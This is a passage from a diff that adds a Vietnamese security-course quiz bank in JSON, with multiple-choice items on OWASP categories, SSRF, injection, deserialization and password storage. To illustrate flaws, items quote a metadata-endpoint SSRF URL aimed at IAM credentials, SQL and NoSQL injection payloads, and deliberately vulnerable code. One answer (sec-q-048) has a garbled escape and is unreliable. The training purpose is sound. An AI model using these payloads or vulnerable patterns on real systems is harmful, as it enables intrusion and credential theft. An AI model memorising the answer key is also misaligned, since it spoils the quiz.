+      "XSS đánh cắp cookie; khắc phục bằng cờ HttpOnly"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Không xoay session ID sau khi nâng quyền dẫn tới session fixation.\n✓ Kẻ tấn công đặt sẵn ID cho nạn nhân và tái dùng ID đó sau đăng nhập; regenerate khi login phá được tấn công này.\n✗ Credential stuffing là thử hàng loạt mật khẩu rò rỉ, không phải vấn đề ở đây.\n✗ Không liên quan đến lọc resource theo chủ sở hữu.\n✗ HttpOnly giảm tác hại XSS nhưng không giải quyết việc tái dùng session ID đặt sẵn."
+  },
+  {
+    "id": "sec-q-027",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Luồng \"Quên mật khẩu\" gửi OTP 6 chữ số, sống 10 phút, code so sánh OTP hoàn toàn chính xác nhưng KHÔNG giới hạn số lần thử. Đây là hạng mục OWASP nào?",
+    "options": [
+      "A04 Insecure Design — thiếu kiểm soát an ninh ngay từ thiết kế",
+      "A03 Injection — input không được làm sạch",
+      "Insecure implementation — code so sánh OTP bị sai",
+      "A07 Identification Failures — OTP quá ngắn"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Code đúng nhưng thiết kế thiếu hẳn biện pháp kiểm soát (rate limit/lockout) là đặc trưng của Insecure Design.\n✓ Đây là thiếu hẳn một biện pháp kiểm soát từ thiết kế, không phải lỗi code.\n✗ Không có injection: OTP được so sánh, không ghép vào query.\n✗ Insecure implementation là có biện pháp nhưng code sai; ở đây hoàn toàn thiếu biện pháp.\n✗ Vấn đề không phải độ dài OTP mà là thiếu rate limit/lockout."
+  },
+  {
+    "id": "sec-q-028",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "multi",
+    "question": "Theo bài, một thiết kế tốt cho luồng OTP đặt lại mật khẩu nên bao gồm những biện pháp nào?",
+    "options": [
+      "Khóa OTP sau N lần thử sai và bắt yêu cầu lại",
+      "So sánh OTP bằng hàm hằng-thời-gian (compare_digest)",
+      "Giới hạn số lần GỬI OTP và global rate limit theo IP",
+      "Lưu OTP dạng plaintext trong cookie phía client để so sánh nhanh",
+      "Tăng bộ đếm số lần thử dù đúng hay sai, và hủy OTP sau khi dùng (one-time thật)"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      2,
+      4
+    ],
+    "explanation": "Thiết kế tốt đưa rate limit, lockout, so sánh an toàn và one-time vào chính luồng.\n✓ Khóa sau N lần sai rồi hủy OTP chống vét cạn.\n✓ compare_digest chống tấn công thời gian.\n✓ Giới hạn số lần gửi và global rate limit theo IP chống phân tán.\n✓ Tăng bộ đếm dù đúng/sai và hủy OTP sau khi dùng đảm bảo one-time thực sự.\n✗ Lưu OTP plaintext phía client là tự lộ bí mật, hoàn toàn sai."
+  },
+  {
+    "id": "sec-q-029",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Bạn dùng STRIDE và đặt câu hỏi \"Error/response có rò rỉ thông tin gì không?\". Câu hỏi này soi mối đe dọa nào?",
+    "options": [
+      "Information disclosure (Lộ thông tin)",
+      "Tampering (Sửa đổi dữ liệu)",
+      "Repudiation (Chối bỏ hành vi)",
+      "Elevation of privilege (Leo thang quyền)"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Lộ thông tin qua error/response chính là chữ I trong STRIDE.\n✓ Information disclosure đặt câu hỏi response/error có rò rỉ gì không.\n✗ Tampering hỏi dữ liệu có bị sửa khi truyền/lưu.\n✗ Repudiation hỏi có log đủ để truy vết.\n✗ Elevation of privilege hỏi có thể vượt quyền không."
+  },
+  {
+    "id": "sec-q-030",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Endpoint Express trên production: `await db.query(\\`SELECT * FROM orders WHERE id = ${req.params.id}\\`)` và khi lỗi trả về full stack trace cho client. Đoạn này dính những vấn đề gì và cách sửa đúng nhất?",
+    "options": [
+      "Vừa SQL injection (nội suy chuỗi vào query) vừa Misconfiguration (lộ stack trace); sửa bằng parameterized query + global error handler trả lỗi chung",
+      "Chỉ là Misconfiguration; chỉ cần tắt stack trace là đủ",
+      "Chỉ là SQL injection; chỉ cần đổi sang truy vấn tham số là đủ",
+      "Không có lỗi gì vì id đến từ route param nên luôn an toàn"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Đoạn code mắc cả hai lỗi cần xử lý đồng thời.\n✓ Nội suy `${req.params.id}` vào query là SQLi; trả full stack trace là Security Misconfiguration; sửa bằng query tham số ($1) và error handler chung che chi tiết nội bộ.\n✗ Chỉ tắt stack trace bỏ qua lỗ hổng SQLi vẫn còn.\n✗ Chỉ sửa SQLi bỏ qua việc vẫn lộ stack trace.\n✗ Route param vẫn do người dùng kiểm soát, không hề an toàn."
+  },
+  {
+    "id": "sec-q-031",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Header nào dùng để chống clickjacking (chặn trang bị nhúng trong iframe)?",
+    "options": [
+      "X-Frame-Options: DENY (hoặc CSP frame-ancestors)",
+      "X-Content-Type-Options: nosniff",
+      "Strict-Transport-Security",
+      "Content-Security-Policy: default-src 'self' (một mình nó)"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Clickjacking được chặn bằng cách cấm nhúng iframe.\n✓ X-Frame-Options: DENY hoặc CSP frame-ancestors chống clickjacking.\n✗ nosniff chống MIME-sniffing.\n✗ HSTS chống downgrade HTTPS.\n✗ default-src 'self' chống XSS/injection, không phải clickjacking (cần frame-ancestors)."
+  },
+  {
+    "id": "sec-q-032",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Theo bài, vì sao một logging library như Log4j (Log4Shell) lại khiến hàng triệu hệ thống bị RCE dù bạn chưa từng chủ động cài nó?",
+    "options": [
+      "Bạn kế thừa lỗ hổng của mọi thư viện import, kể cả transitive dependency (thư viện của thư viện)",
+      "Vì logging library luôn chạy với quyền root",
+      "Vì stack trace của Log4j tự động bật chế độ debug",
+      "Vì npm audit không hỗ trợ thư viện Java"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Rủi ro đến từ chuỗi phụ thuộc gián tiếp.\n✓ Bạn kế thừa CVE của cả transitive dependency mà mình không nhớ đã kéo vào.\n✗ Library không mặc nhiên chạy quyền root.\n✗ Stack trace không liên quan tới cơ chế RCE của Log4Shell.\n✗ npm audit dành cho Node; điều này không giải thích vì sao bị ảnh hưởng."
+  },
+  {
+    "id": "sec-q-033",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Đối với A06 (Vulnerable & Outdated Components), đâu là các thực hành đúng theo bài?",
+    "options": [
+      "Commit lockfile (package-lock.json, poetry.lock) để build tái lập được",
+      "Cho SCA chạy trong CI và FAIL build khi có lỗ hổng high/critical",
+      "Sinh SBOM để biết chính xác đang chạy gì; chỉ lấy package từ registry chính thức",
+      "Ưu tiên \"patch hoàn hảo\" sau nhiều tháng kiểm thử hơn là \"patch nhanh\"",
+      "Bật Dependabot/Renovate để tự tạo PR cập nhật và loại bỏ dependency không dùng"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      2,
+      4
+    ],
+    "explanation": "Quản lý dependency tốt = tái lập, chặn CI, minh bạch và vá nhanh.\n✓ Lockfile cho build tái lập.\n✓ SCA fail build với high/critical.\n✓ SBOM và registry chính thức (cảnh giác typosquatting).\n✓ Dependabot/Renovate vá tự động, loại dependency thừa.\n✗ Bài nhấn mạnh \"patch nhanh\" quan trọng hơn \"patch hoàn hảo\" vì cửa sổ bị tấn công kéo dài."
+  },
+  {
+    "id": "sec-q-034",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Endpoint `/import` chạy `state = pickle.loads(req.body)` với body do client gửi. Rủi ro chính và cách sửa đúng là gì?",
+    "options": [
+      "RCE do deserialize dữ liệu không tin cậy; sửa bằng format thuần như JSON + validate schema (vd Pydantic)",
+      "Chỉ là DoS do payload lớn; sửa bằng giới hạn kích thước body",
+      "Lộ thông tin do pickle in ra log; sửa bằng tắt logging",
+      "Không sao vì pickle nhanh hơn JSON; chỉ cần thêm try/except"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "pickle.loads trên input attacker cho phép chạy mã tùy ý qua __reduce__.\n✓ Đây là insecure deserialization dẫn tới RCE; sửa bằng JSON + schema validation, format không thực thi.\n✗ Vấn đề cốt lõi là RCE, không phải chỉ DoS kích thước.\n✗ Không phải vấn đề logging.\n✗ try/except không ngăn mã độc đã chạy trong lúc deserialize."
+  },
+  {
+    "id": "sec-q-035",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Trong Dockerfile, vì sao nên dùng `FROM node:20-slim@sha256:5e7f...` thay vì `FROM node:20`?",
+    "options": [
+      "Ghim theo digest là immutable — nội dung không thể bị tráo, đảm bảo tính toàn vẹn",
+      "Digest tải nhanh hơn nhiều so với tag",
+      "Tag :node:20 không tồn tại trên registry",
+      "Digest tự động vá CVE mới nhất khi build lại"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Tag mềm có thể bị thay nội dung bên dưới; digest thì cố định.\n✓ Ghim theo digest đảm bảo image bất biến, chống bị tráo (Integrity).\n✗ Tốc độ tải không phải lý do.\n✗ Tag node:20 vẫn tồn tại bình thường.\n✗ Digest cố định nội dung nên KHÔNG tự nhận CVE mới; đó là đánh đổi cần kết hợp cập nhật chủ động."
+  },
+  {
+    "id": "sec-q-036",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Trong handler login, dòng nào KHÔNG nên xuất hiện trong log security?",
+    "options": [
+      "log.info(\"login\", password=password)",
+      "log.warning(\"auth.login.failed\", username=username, ip=request.client.ip)",
+      "log.info(\"auth.login.success\", user_id=user.id, ip=request.client.ip)",
+      "log.info(\"payment\", card_last4=card[-4:], user_id=user.id)"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Log phải ghi định danh, tuyệt đối không ghi bí mật.\n✓ Log password là lộ credential — tự gây lỗ hổng.\n✗ Ghi username + ip cho login fail là đúng (không kèm password).\n✗ Ghi user_id + ip cho login success là hợp lệ.\n✗ Ghi card_last4 + user_id là cách log an toàn, chỉ giữ định danh."
+  },
+  {
+    "id": "sec-q-037",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Tính năng \"nhập ảnh từ URL\" chạy `requests.get(url)` với url do user nhập. Attacker nhập `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`. Hậu quả nguy hiểm nhất là gì?",
+    "options": [
+      "Server gọi metadata endpoint và trả về credential IAM tạm thời — attacker chiếm quyền hệ thống (SSRF)",
+      "Server bị XSS vì URL chứa script",
+      "Server bị SQL injection qua tham số url",
+      "Chỉ tải về một ảnh hỏng, không có rủi ro"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Đây là SSRF kinh điển tới metadata endpoint trong cloud.\n✓ Server fetch 169.254.169.254 trả về credential IAM tạm thời cho attacker.\n✗ Không phải XSS — đây là server-side fetch, không render script ở trình duyệt.\n✗ Không có truy vấn SQL nào liên quan.\n✗ Hoàn toàn không vô hại — đây là một trong những SSRF nguy hiểm nhất."
+  },
+  {
+    "id": "sec-q-038",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Khi chống SSRF cho hàm fetch URL của user, theo bài đâu là cách tiếp cận đúng và mạnh nhất?",
+    "options": [
+      "Allowlist scheme/domain, resolve DNS rồi kiểm tra IP đích, và allow_redirects=False",
+      "Blocklist các IP nội bộ trên chuỗi hostname trước khi gọi",
+      "Cho phép mọi http/https nhưng đặt timeout ngắn",
+      "Chỉ chặn scheme file:// là đủ"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "Allowlist + kiểm tra IP sau khi resolve DNS + chặn redirect là phòng thủ đúng.\n✓ Phải allowlist và kiểm IP đích SAU khi resolve DNS, đồng thời chặn redirect (redirect có thể trỏ về IP nội bộ).\n✗ Blocklist trên chuỗi hostname dễ bị vượt qua (0x, octal, [::], DNS rebinding); phải kiểm tra IP sau resolve.\n✗ Timeout không ngăn được việc gọi tới metadata.\n✗ Chặn mỗi file:// không ngăn được fetch tới IP nội bộ qua http."
+  },
+  {
+    "id": "sec-q-039",
+    "courseId": "SECURITY",
+    "lesson": "sec-03-owasp-top10-2",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Trên AWS, biện pháp \"một dòng cấu hình\" được bài nhấn mạnh để triệt tiêu lớp tấn công SSRF-tới-metadata kinh điển là gì?",
+    "options": [
+      "Bắt buộc IMDSv2 (HttpTokens=required) trên mọi EC2 instance",
+      "Bật CloudTrail cho toàn account",
+      "Dùng KMS để mã hóa EBS",
+      "Đặt S3 Block Public Access"
+    ],
+    "correctIndices": [
+      0
+    ],
+    "explanation": "IMDSv2 yêu cầu token nên vô hiệu hóa SSRF kiểu cũ tới metadata.\n✓ HttpTokens=required (IMDSv2) là cấu hình một dòng triệt tiêu SSRF-tới-metadata.\n✗ CloudTrail dùng cho audit/logging (A09), không chặn SSRF.\n✗ KMS dùng cho mã hóa, không liên quan SSRF.\n✗ S3 Block Public Access thuộc A05 Misconfiguration, không liên quan metadata."
+  },
+  {
+    "id": "sec-q-040",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Endpoint nhận `?sort=name` và xây câu lệnh `ORDER BY <sort>`. Bạn muốn chống SQLi cho phần ORDER BY. Cách tiếp cận đúng và bền vững nhất là gì?",
+    "options": [
+      "Chặn các từ/ký tự nguy hiểm như `;`, `--`, `drop` bằng blocklist trước khi nội suy",
+      "Map giá trị `sort` qua một allowlist các key hợp lệ đã biết, thiếu rule thì từ chối",
+      "Dùng prepared statement để bind tên cột vào placeholder",
+      "Escape chuỗi `sort` bằng hàm escape của driver rồi nội suy vào câu SQL"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "ORDER BY là tên cột/từ khoá, placeholder không bind được, nên phải allowlist các giá trị hợp lệ.\n✓ Map qua allowlist và default deny là cách đúng cho phần ORDER BY mà parameter binding không xử lý được.\n✗ Blocklist luôn thua vì attacker dùng biến thể chưa nghĩ ra (ví dụ blind SQLi qua CASE WHEN).\n✗ Placeholder chỉ bind được giá trị, không bind được tên bảng/cột hay từ khoá.\n✗ Escape rồi nội suy vẫn là ghép chuỗi vào SQL, không an toàn cho định danh."
+  },
+  {
+    "id": "sec-q-041",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Vì sao parameterized query / prepared statement chống được SQL injection ngay cả khi input chứa `' OR 1=1--`?",
+    "options": [
+      "Driver tự động loại bỏ các ký tự đặc biệt trong input trước khi gửi",
+      "Dữ liệu được gửi tách khỏi mã lệnh, nên input chỉ là giá trị, không bao giờ bị parse thành SQL",
+      "Driver chạy validate allowlist trên mọi tham số trước khi thực thi",
+      "Câu lệnh được mã hoá nên attacker không đọc được nội dung"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Cốt lõi là tách data khỏi code: placeholder để driver gửi giá trị riêng.\n✓ Input đi như một giá trị tách biệt nên dù chứa cú pháp SQL nó vẫn không được parse thành lệnh.\n✗ Cơ chế không phải là lọc/loại ký tự đặc biệt.\n✗ Parameter binding không thực hiện validate allowlist; đó là lớp riêng.\n✗ Không liên quan đến mã hoá câu lệnh."
+  },
+  {
+    "id": "sec-q-042",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Đoạn Node.js: `app.post('/users', (req,res)=>{ User.create(req.body) })`. Attacker gửi body `{\"email\":\"a@x.com\",\"is_admin\":true}`. Đây là lỗ hổng gì và sửa thế nào?",
+    "options": [
+      "SQL injection — chuyển sang prepared statement",
+      "Mass assignment — allowlist các field được nhận, không bind thẳng request vào model/ORM",
+      "XSS — HTML-encode các field trước khi lưu",
+      "SSRF — kiểm tra domain trong field email"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Bind thẳng req.body vào ORM cho attacker set field ngoài ý muốn như is_admin.\n✓ Đây là mass assignment; cách chống là allowlist field nhận được (ví dụ validate qua schema) thay vì bind cả request.\n✗ Không phải SQLi; vấn đề nằm ở việc nhận field tuỳ ý, không phải ghép chuỗi SQL.\n✗ XSS là vấn đề output context, không phải gán field khi tạo object.\n✗ SSRF liên quan tới việc service gọi URL do attacker kiểm soát, không phải tình huống này."
+  },
+  {
+    "id": "sec-q-043",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Một giá trị user-controlled được HTML-entity encode rồi đặt vào `href=\"javascript:alert('<value>')\"`. Kết quả về mặt an toàn là gì?",
+    "options": [
+      "An toàn, vì HTML encoding đã trung hoà mọi ký tự nguy hiểm",
+      "Vẫn không an toàn, vì encode phải theo context đích (JS/URL), `<` không phải ký tự nguy hiểm trong JS",
+      "An toàn, vì `javascript:` URL bị trình duyệt chặn mặc định",
+      "Vẫn không an toàn, nhưng chỉ với trình duyệt cũ"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Encoding phải đúng context nơi dữ liệu được đặt vào, không phải đúng nguồn.\n✓ Trong context JS/URL, HTML encode không trung hoà các ký tự nguy hiểm (như nháy đơn), nên giá trị vẫn breakout được.\n✗ HTML encoding chỉ phù hợp HTML body, không phù hợp JS context.\n✗ Trình duyệt không chặn mọi javascript: URL theo mặc định trong tình huống này.\n✗ Vấn đề không giới hạn ở trình duyệt cũ; sai context là sai bản chất."
+  },
+  {
+    "id": "sec-q-044",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "API Python chạy `obj = pickle.loads(request.body)` với body do client gửi. Rủi ro nghiêm trọng nhất và cách xử lý đúng?",
+    "options": [
+      "Lộ thông tin — thêm try/except để giấu lỗi",
+      "RCE — pickle có thể khởi tạo class/chạy code khi load; chuyển sang JSON (data-only) rồi validate",
+      "DoS — giới hạn kích thước body là đủ",
+      "CSRF — thêm token chống CSRF cho endpoint"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "pickle.loads trên dữ liệu network là một trong các lỗ hổng dễ dẫn tới RCE nhất.\n✓ Pickle là định dạng mang hành vi, có thể khởi tạo class và chạy code; thay bằng JSON data-only rồi validate là cách đúng.\n✗ Giấu lỗi không xử lý gốc rễ là khả năng chạy code.\n✗ Giới hạn kích thước không ngăn được gadget chain thực thi code.\n✗ CSRF không phải vấn đề ở đây."
+  },
+  {
+    "id": "sec-q-045",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Form login phân biệt thông điệp `\"Email không tồn tại\"` và `\"Sai mật khẩu\"`. Vấn đề bảo mật và cách khắc phục?",
+    "options": [
+      "Không có vấn đề, thông điệp rõ ràng giúp UX tốt hơn",
+      "User enumeration — dùng thông điệp đồng nhất kiểu \"Email hoặc mật khẩu không đúng\"",
+      "SQL injection — parameterize câu truy vấn user",
+      "Mass assignment — allowlist field của form login"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Thông điệp khác nhau cho phép dò ra email hợp lệ để brute-force/credential stuffing.\n✓ Đây là user enumeration; phòng bằng thông điệp generic đồng nhất (và so sánh thời gian không đổi).\n✗ Thông điệp chi tiết tiện cho UX nhưng giúp attacker do thám.\n✗ Vấn đề là rò rỉ thông tin qua thông điệp, không phải ghép chuỗi SQL.\n✗ Không liên quan tới gán field tuỳ ý."
+  },
+  {
+    "id": "sec-q-046",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Theo bài học, mật khẩu người dùng nên được xử lý như thế nào trước khi lưu?",
+    "options": [
+      "Mã hoá đối xứng AES với một key chung để có thể giải ngược khi cần",
+      "Hash bằng thuật toán chậm (bcrypt/argon2/scrypt) kèm per-user salt",
+      "Mã hoá rồi base64 để tránh lưu plaintext",
+      "Hash bằng MD5/SHA-256 một lần cho nhanh"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Mật khẩu phải hash, không phải encrypt (không cần và không nên giải ngược được).\n✓ Hash bằng thuật toán chậm với per-user salt là yêu cầu nêu trong bài.\n✗ Mã hoá đối xứng giải ngược được, sai bản chất xử lý mật khẩu.\n✗ Base64 không phải mã hoá và việc giải ngược vẫn sai hướng.\n✗ MD5/SHA-256 nhanh và không salt theo user là không phù hợp cho mật khẩu."
+  },
+  {
+    "id": "sec-q-047",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Code có `requests.get(url, verify=False)` để gọi một service nội bộ qua HTTPS. Đánh giá nào đúng?",
+    "options": [
+      "Chấp nhận được vì traffic nội bộ trong mạng tin cậy",
+      "Mở đường cho man-in-the-middle; nên để verify mặc định (verify=True) kể cả với service nội bộ",
+      "Cần thiết để tránh lỗi certificate khi rotate cert",
+      "Chỉ là vấn đề hiệu năng, không phải bảo mật"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Tắt verify TLS cho phép kẻ tấn công chèn giữa kết nối.\n✓ Đây là rủi ro MITM; phải để verify mặc định, và không tin cậy mạng nội bộ (zero trust, TLS mọi nơi).\n✗ Không nên tin cậy mạng nội bộ; bài nhấn mạnh TLS cả traffic nội bộ.\n✗ Tắt verify để tránh lỗi cert là cái cớ tiện lợi nhưng phá vỡ bảo mật.\n✗ Đây là vấn đề bảo mật, không phải hiệu năng."
+  },
+  {
+    "id": "sec-q-048",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Bạn cần nhúng `userData` vào trang server-side bên trong `<script>window.__DATA__ = ...</script>`. Cách an toàn nhất là gì?",
+    "options": [
+      "HTML-entity encode userData rồi nội suy thẳng vào script",
+      "JSON.stringify(userData) rồi thay `<` bằng `<` để chặn breakout `</script>`",
+      "URL-encode userData trước khi đặt vào script",
+      "Đặt userData vào thuộc tính data-* rồi đọc bằng JS, không cần encode"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Trong context JS phải encode theo JS và xử lý riêng chuỗi `</script>` có thể thoát khỏi thẻ.\n✓ JSON.stringify encode JS string/object, và replace `<` thành `<` chặn breakout `</script>` — đúng như bài chỉ.\n✗ HTML-entity encode sai context vì `<` không phải ký tự nguy hiểm trong JS.\n✗ URL-encode dành cho URL component, không phù hợp nội dung trong <script>.\n✗ Đặt vào data-* vẫn cần attribute encode đúng; nói không cần encode là sai."
+  },
+  {
+    "id": "sec-q-049",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "single",
+    "question": "Theo nguyên tắc của bài, encryption at rest thực chất chuyển bài toán bảo vệ dữ liệu thành bài toán nào?",
+    "options": [
+      "Bảo vệ thuật toán mã hoá tự cài đặt",
+      "Bảo vệ key: tách key khỏi dữ liệu, rotate, phân quyền, audit truy cập key",
+      "Bảo vệ băng thông mạng khi truyền dữ liệu",
+      "Bảo vệ định dạng serialize của dữ liệu"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Encryption chuyển 'bảo vệ dữ liệu' thành 'bảo vệ key'; nếu key nằm cạnh dữ liệu thì chưa bảo vệ được gì.\n✓ Key management (tách key, rotate, phân quyền, audit) là phần khó hơn cả thuật toán.\n✗ Bài khuyên đừng tự cài thuật toán crypto; dùng thư viện đã audit.\n✗ Băng thông mạng liên quan tới in transit nhưng không phải bài toán cốt lõi của at rest.\n✗ Định dạng serialize là vấn đề khác (deserialization)."
+  },
+  {
+    "id": "sec-q-050",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "hard",
+    "type": "multi",
+    "question": "Chọn TẤT CẢ các phát biểu ĐÚNG về validate input và tách data khỏi code theo bài học.",
+    "options": [
+      "Validate nên thực hiện tại boundary (controller/handler), không rải rác trong business logic",
+      "Nên canonicalize/normalize Unicode trước khi validate để tránh bypass",
+      "Validate input bằng allowlist đã đủ để thay thế parameterized query chống SQLi",
+      "Với OS command nên truyền mảng args qua API thay vì ghép chuỗi đưa vào shell",
+      "Default deny: thiếu rule thì cho qua để tránh chặn nhầm người dùng hợp lệ"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      3
+    ],
+    "explanation": "Bài nhấn mạnh validate tại boundary, normalize trước validate, và truyền args mảng cho OS command.\n✓ Validate tại boundary giúp tập trung và truyền object đã kiểm chứng vào sâu bên trong.\n✓ Canonicalize/normalize Unicode trước validate tránh bypass.\n✓ Truyền args mảng (không sh -c chuỗi) chống command injection.\n✗ Validate là defense in depth, không thay thế parameterized query.\n✗ Default deny nghĩa là thiếu rule thì TỪ CHỐI, không phải cho qua."
+  },
+  {
+    "id": "sec-q-051",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "multi",
+    "question": "Chọn TẤT CẢ thực hành ĐÚNG khi xử lý lỗi và quản lý PII/secret theo bài.",
+    "options": [
+      "Trả thông điệp generic kèm request_id ra client, chi tiết và stack trace chỉ vào log nội bộ",
+      "Mask PII (ví dụ email) trước khi đưa vào log; không dump cả object request",
+      "Fail open khi không chắc, để không chặn nhầm người dùng",
+      "Không log secret/PII; dùng tokenization và data minimization",
+      "Gửi nguyên `req.body` vào error tracker (Sentry...) để debug dễ hơn"
+    ],
+    "correctIndices": [
+      0,
+      1,
+      3
+    ],
+    "explanation": "Bài yêu cầu thông điệp generic ra ngoài, mask PII, không log secret/PII và fail closed.\n✓ Generic message + request_id ra client, chi tiết vào log là đúng.\n✓ Mask PII và không dump cả object tránh rò rỉ.\n✓ Không log secret/PII, dùng tokenization và data minimization là nguyên tắc cốt lõi.\n✗ Phải fail closed (từ chối khi không chắc), không fail open.\n✗ Gửi nguyên req.body vào error tracker có thể đẩy số thẻ/PII vào hệ thống lưu lâu, nhiều người xem."
+  },
+  {
+    "id": "sec-q-052",
+    "courseId": "SECURITY",
+    "lesson": "sec-04-secure-coding",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "medium",
+    "type": "single",
+    "question": "Một filter MongoDB nhận trực tiếp object từ user: `db.users.find(req.body.filter)`. Attacker gửi `{\"password\": {\"$gt\": \"\"}}`. Đây là gì và phòng thế nào?",
+    "options": [
+      "XSS — output-encode kết quả trước khi render",
+      "NoSQL injection — không truyền object thô từ user vào filter, validate/ép kiểu theo schema",
+      "Deserialization nguy hiểm — chuyển sang yaml.safe_load",
+      "IDOR — kiểm tra quyền sở hữu bản ghi"
+    ],
+    "correctIndices": [
+      1
+    ],
+    "explanation": "Truyền object thô từ user vào filter cho attacker chèn toán tử như $gt — đây là NoSQL injection.\n✓ Cách phòng là không truyền object thô vào filter, validate/ép kiểu theo schema (tương tự nguyên tắc tách data khỏi code).\n✗ XSS là vấn đề output context, không liên quan filter truy vấn.\n✗ Đây không phải deserialize định dạng mang hành vi.\n✗ IDOR là vấn đề authorization trên bản ghi, không phải toán tử lọt vào query."
+  },
+  {
+    "id": "sec-q-053",
+    "courseId": "SECURITY",
+    "lesson": "sec-05-authn-authz",
+    "certifications": [
+      "SECURITY"
+    ],
+    "difficulty": "easy",
+    "type": "single",
+    "question": "Sự khác nhau cốt lõi giữa Authentication (AuthN) và Authorization (AuthZ) là gì?",
+    "options": [
+      "AuthN trả lời \"bạn là ai?\", AuthZ trả lời \"bạn được làm gì?\"",
+      "AuthN dành cho web, AuthZ dành cho mobile",
+      "AuthN dùng cookie, AuthZ luôn dùng JWT",
+      "AuthN kiểm quyền từng tài nguyên, AuthZ chứng minh danh tính"
+    ],
